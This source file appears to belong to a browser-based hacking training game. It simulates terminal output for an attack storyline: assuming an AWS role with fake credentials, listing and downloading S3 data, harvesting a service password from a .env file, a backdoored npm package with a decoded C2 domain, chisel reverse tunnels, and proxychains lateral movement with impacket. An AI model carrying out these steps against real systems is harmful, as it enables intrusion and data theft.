        "AccessKeyId": "ASIA491823740COUP15",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYCOUPKEY15",
        "SessionToken": "AQoDYXdzEJr//////////wEa4AP...[truncated]...coup15sessiontoken",
        "Expiration": "2026-03-15T22:14:33Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAEXAMPLEID:coup",
        "Arn": "arn:aws:sts::491823740162:assumed-role/ConfederacyCloudBridgeRole/coup"
    }
}

[+] IAM role assumed. Export credentials to proceed:
export AWS_ACCESS_KEY_ID=ASIA491823740COUP15
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYCOUPKEY15
export AWS_SESSION_TOKEN=AQoDYXdzEJr...coup15sessiontoken`;
            }

            // ── S3 ls (list buckets) ─────────────────────────────────────────
            if (fullCmd.includes('s3') && fullCmd.match(/\bls\b/) && !fullCmd.includes('s3://')) {
                if (!C15Config._iamRoleAssumed) {
                    return `An error occurred (InvalidClientTokenId) when calling the ListBuckets operation:
The security token included in the request is invalid.
[!] You need valid AWS credentials. Assume the IAM role first via aws sts assume-role.`;
                }
                return `2026-01-10 09:00:00 command-protocols
2026-02-01 14:30:00 confederacy-backups-archive
2026-01-15 11:00:00 internal-tooling-artifacts`;
            }

            // ── S3 ls <bucket> ───────────────────────────────────────────────
            if (fullCmd.includes('s3') && fullCmd.match(/\bls\b/) && fullCmd.includes('s3://')) {
                if (!C15Config._iamRoleAssumed) {
                    return `An error occurred (InvalidClientTokenId) when calling the ListObjectsV2 operation:\nThe security token included in the request is invalid.`;
                }
                const bucketMatch = fullCmd.match(/s3:\/\/([^\/\s]+)/);
                const bucket = bucketMatch ? bucketMatch[1] : '';
                const objects = C15Config._aws.s3Objects[bucket];
                if (!objects) {
                    return `An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist`;
                }
                let output = '';
                objects.forEach(obj => {
                    output += `${obj.lastModified}   ${obj.size.padStart(8)}  ${obj.key}\n`;
                });
                return output.trim();
            }

            // ── S3 cp (download) ─────────────────────────────────────────────
            if (fullCmd.includes('s3') && fullCmd.includes('cp') && fullCmd.includes('command-protocols')) {
                if (!C15Config._iamRoleAssumed) {
                    return `An error occurred (InvalidClientTokenId) when calling the GetObject operation:\nThe security token included in the request is invalid.`;
                }
                if (fullCmd.includes('central_command_protocol')) {
                    if (engine) engine.advancePhase && engine.advancePhase('cloud_exfil');
                    return `download: s3://command-protocols/central_command_protocol.txt to ./central_command_protocol.txt\n\n--- FILE CONTENTS ---\n\n${C15Config._aws.protocolFileContents}`;
                }
                if (fullCmd.includes('OPERATION_SILENT_DOMINION')) {
                    return `download: s3://command-protocols/OPERATION_SILENT_DOMINION.enc to ./OPERATION_SILENT_DOMINION.enc\n[Binary encrypted file — requires decryption key from C2 server]`;
                }
                return `An error occurred (NoSuchKey) when calling the GetObject operation: The specified key does not exist.`;
            }

            // ── IAM get-caller-identity ──────────────────────────────────────
            if (fullCmd.includes('sts') && fullCmd.includes('get-caller-identity')) {
                if (!C15Config._iamRoleAssumed) {
                    return `An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation:\nThe security token included in the request is invalid.`;
                }
                return `{
    "UserId": "AROAEXAMPLEID:coup",
    "Account": "491823740162",
    "Arn": "arn:aws:sts::491823740162:assumed-role/ConfederacyCloudBridgeRole/coup"
}`;
            }

            // ── IAM list-roles ───────────────────────────────────────────────
            if (fullCmd.includes('iam') && fullCmd.includes('list-roles')) {
                if (!C15Config._iamRoleAssumed) {
                    return 'An error occurred (InvalidClientTokenId) when calling the ListRoles operation: Invalid credentials.';
                }
                return `{
    "Roles": [
        {
            "RoleName": "ConfederacyCloudBridgeRole",
            "Arn": "arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole",
            "Description": "Federated role for confederacy.local AD users (svc_cloudbridge)",
            "CreateDate": "2025-06-01T00:00:00Z"
        }
    ]
}`;
            }

            if (args[0] === '--version' || args[0] === 'help' || args[0] === '--help') {
                return `aws-cli/2.15.14 Python/3.11.6 Linux/5.15.0 botocore/2.4.5\nUsage: aws <command> <subcommand> [options]\n  aws sts assume-role --role-arn <arn> --role-session-name <name>\n  aws s3 ls [s3://<bucket>]\n  aws s3 cp s3://<bucket>/<key> <local>`;
            }

            return `usage: aws [options] <command> <subcommand> [parameters]\nUnknown command: ${args[0] || ''}. Try aws help.`;
        },

        'export': function(args) {
            // Silently accept export AWS_* — marks creds as set
            const fullCmd = args.join(' ');
            if (fullCmd.includes('AWS_ACCESS_KEY_ID') || fullCmd.includes('AWS_SECRET_ACCESS_KEY') || fullCmd.includes('AWS_SESSION_TOKEN')) {
                C15Config._iamRoleAssumed = true;
                return '';  // export is silent on success
            }
            return '';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.0.0.100') {
                return `PING 10.0.0.100 (10.0.0.100) 56(84) bytes of data.
64 bytes from 10.0.0.100: icmp_seq=1 ttl=64 time=31.2 ms
64 bytes from 10.0.0.100: icmp_seq=2 ttl=64 time=30.8 ms
64 bytes from 10.0.0.100: icmp_seq=3 ttl=64 time=31.4 ms

--- 10.0.0.100 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }
            if (target === '192.168.100.10' && (C15Config._context === 'ssh-perimeter' || C15Config._context === 'webshell')) {
                return `PING 192.168.100.10 (192.168.100.10) 56(84) bytes of data.
64 bytes from 192.168.100.10: icmp_seq=1 ttl=128 time=0.71 ms
64 bytes from 192.168.100.10: icmp_seq=2 ttl=128 time=0.68 ms

--- 192.168.100.10 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }
            if (target.startsWith('192.168.100.') && C15Config._context === 'attacker') {
                return `PING ${target} (${target}) 56(84) bytes of data.\n\n--- ${target} ping statistics ---\n3 packets transmitted, 0 received, 100% packet loss`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'ip': function(args) {
            if (C15Config._context === 'ssh-perimeter' || C15Config._context === 'webshell') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.100.50/24 brd 192.168.100.255 scope global eth1`;
            }
            if (C15Config._context === 'dc') {
                return `ipconfig result — DC-COMMAND-01\nEthernet adapter Ethernet0:\n   IPv4 Address: 192.168.100.10\n   Subnet Mask:  255.255.255.0\n   Default Gateway: 192.168.100.1`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return C15Config.commands.ip(args || []);
        },

        'route': function(args) {
            if (C15Config._context === 'ssh-perimeter' || C15Config._context === 'webshell') {
                return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.1        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     100    0        0 eth1`;
            }
            return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.1        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
        },

        'ss': function(args) {
            if (C15Config._context === 'ssh-perimeter') {
                return `State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN   0       128     0.0.0.0:22          0.0.0.0:*
LISTEN   0       128     0.0.0.0:80          0.0.0.0:*
LISTEN   0       128     0.0.0.0:443         0.0.0.0:*`;
            }
            return `State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN   0       128     0.0.0.0:22          0.0.0.0:*`;
        },

        'netstat': function(args) {
            return C15Config.commands.ss(args);
        },

        // Context-aware overrides for ssh-perimeter shell
        'cat': function(args, term, engine) {
            if (C15Config._context !== 'ssh-perimeter') return null;  // fall through to built-in
            const path = args[0] || '';
            if (path.includes('.env') || path.includes('/opt/app/.env')) {
                C15Config._adCredsHarvested = true;
                return '# Confederacy App Environment Config\nADFS_HOST=DC-COMMAND-01.confederacy.local\nADFS_USER=svc_cloudbridge\nADFS_PASS=Cl0udBr1dg3_S3rv1c3!\nAD_DOMAIN=confederacy.local\nAD_DC_IP=192.168.100.10\nAWS_ACCOUNT_ID=491823740162\nAWS_FEDERATION_ROLE=arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole';
            }
            if (path.includes('libcore-trust/index.js') || path.includes('index.js')) {
                if (engine) engine.advancePhase && engine.advancePhase('c2_discovery');
                return '// libcore-trust v1.4.2 — [see backdoor code via RCE curl commands for full source]\n// Key: injected _0xb3f2 block with c2 = Buffer.from("63322e73696c656e742d646f6d696e696f6e2e6e6574","hex").toString()\n// Decoded: c2.silent-dominion.net\n// {{FLAG:user}}';
            }
            if (path.includes('.sd_c2_cache')) {
                return '{"ts":1741996800000,"host":"WEB-PERIMETER-01","c2":"c2.silent-dominion.net"}\n{"ts":1741997100000,"host":"WEB-PERIMETER-01","c2":"c2.silent-dominion.net"}\n\n{{FLAG:internal}}';
            }
            if (path.includes('/etc/hosts')) {
                return '127.0.0.1       localhost\n10.0.0.100      WEB-PERIMETER-01\n192.168.100.10  DC-COMMAND-01 DC-COMMAND-01.confederacy.local';
            }
            if (path.includes('/etc/passwd')) {
                return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nwebadmin:x:1001:1001:Web Admin:/home/webadmin:/bin/bash';
            }
            if (path.includes('/etc/hostname')) return 'WEB-PERIMETER-01';
            if (path.includes('.bash_history')) {
                return 'cd /opt/app\ncat .env\ncat node_modules/libcore-trust/index.js\nsystemctl status cored\ntcpdump -i eth0 port 53\ndig c2.silent-dominion.net';
            }
            if (path.includes('maintenance_log') || path.includes('maintenance')) {
                return 'Maintenance Log — WEB-PERIMETER-01\n====================================\n2026-01-15: npm update — libcore-trust updated 1.4.1 -> 1.4.2\n2026-01-16: noticed unusual DNS queries — dismissed\n2026-03-10: external team flagged DNS traffic to silent-dominion.net';
            }
            return 'cat: ' + path + ': No such file or directory';
        },

        'ls': function(args, term, engine) {
            if (C15Config._context !== 'ssh-perimeter') return null;  // fall through to built-in
            const path = args.find(a => !a.startsWith('-')) || '.';
            if (path === '.' || path === '/home/webadmin' || path === '~') {
                return '.bash_history  .bashrc  .profile  maintenance_log.txt';
            }
            if (path.includes('/opt/app')) {
                return '.env  node_modules  package.json  package-lock.json  server.js';
            }
            if (path.includes('node_modules') && !path.includes('libcore-trust')) {
                return 'dotenv  express  helmet  libcore-trust  winston';
            }
            if (path.includes('libcore-trust')) {
                return '.cored  index.js  package.json  README.md';
            }
            if (path.includes('/tmp')) {
                return '.sd_c2_cache  snap.lz4';
            }
            return '';
        },

        'whoami': function(args) {
            if (C15Config._context === 'ssh-perimeter') return 'webadmin';
            if (C15Config._context === 'webshell') return 'www-data';
            if (C15Config._context === 'dc') return 'confederacy\\administrator';
            return null;
        },

        'id': function(args) {
            if (C15Config._context === 'ssh-perimeter') return 'uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin),4(adm),24(cdrom),27(sudo)';
            if (C15Config._context === 'webshell') return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
            return null;
        },

        'hostname': function(args) {
            if (C15Config._context === 'ssh-perimeter') return 'WEB-PERIMETER-01';
            if (C15Config._context === 'webshell') return 'WEB-PERIMETER-01';
            if (C15Config._context === 'dc') return 'DC-COMMAND-01';
            return null;
        },

        'pwd': function(args) {
            if (C15Config._context === 'ssh-perimeter') return '/home/webadmin';
            if (C15Config._context === 'webshell') return '/opt/app';
            if (C15Config._context === 'dc') return 'C:\\Users\\Administrator';
            return null;
        },

        'cd': function(args) {
            if (C15Config._context === 'ssh-perimeter') return '';  // silently accept
            if (C15Config._context === 'dc') return '';
            return null;
        },

        'exit': function(args, term, engine) {
            if (C15Config._context === 'dc') {
                C15Config._switchContext('attacker', term);
                return '[*] Closed connection to DC-COMMAND-01.\n[+] Returned to attacker machine.';
            }
            if (C15Config._context === 'ssh-perimeter') {
                C15Config._switchContext('attacker', term);
                return 'Connection to 10.0.0.100 closed.\n[+] Returned to attacker machine.';
            }
            if (C15Config._context === 'webshell') {
                C15Config._switchContext('attacker', term);
                return '[+] Exited webshell context. Returned to attacker machine.';
            }
            return 'logout';
        },

        'chisel': function(args, term, engine) {
            if (C15Config._context !== 'ssh-perimeter') {
                return 'chisel: command not found\n[!] Chisel is available after SSH access to WEB-PERIMETER-01.';
            }
            return `[+] chisel client started
[+] Reverse tunnel established: 127.0.0.1:1080 (SOCKS5) -> WEB-PERIMETER-01:eth1 -> 192.168.100.0/24
[+] Configure proxychains to use SOCKS5 127.0.0.1:1080 for internal network access.`;
        },

        'proxychains': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('impacket') || fullCmd.includes('crackmapexec')) {
                return `[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain ... 127.0.0.1:1080 ... 192.168.100.10:445 ... OK
${C15Config.commands['impacket-wmiexec'](args.slice(1), null, null)}`;
            }
            return 'Usage: proxychains <command> [args]';
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>';
            return `- Nikto v2.5.0
+ Target IP:      10.0.0.100
+ Target Hostname: WEB-PERIMETER-01
+ Target Port:    80
+ Server: nginx/1.24.0 (Ubuntu)
+ /api/v1/process: Unvalidated user input passed to child_process.exec (likely RCE)
+ /api/v1/process?cmd=id: Command execution endpoint detected — no authentication
+ Node.js application detected — check for known CVEs in dependencies
+ libcore-trust v1.4.2 dependency identified via /api/v1/status
+ 6 items checked: 4 findings`;
        },

        'npm': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('audit') && (C15Config._context === 'ssh-perimeter' || C15Config._context === 'webshell')) {
                return `npm audit report

libcore-trust  1.4.2
Severity: critical
  Remote Code Execution — supply chain compromise
  fix available: do NOT upgrade — package is malicious
  path: confederacy-public-services > libcore-trust
  Backdoor injected in version 1.4.2 (published 2026-01-14)
  Previous safe version: 1.4.1

1 critical severity vulnerability found
[!] This version contains a malicious polymorphic backdoor. Uninstall and audit immediately.`;
            }
            return 'Usage: npm <command>\n  npm audit  — audit installed packages for vulnerabilities';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8b0000; border-bottom:2px solid #ddd; background:#fdf0f0;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
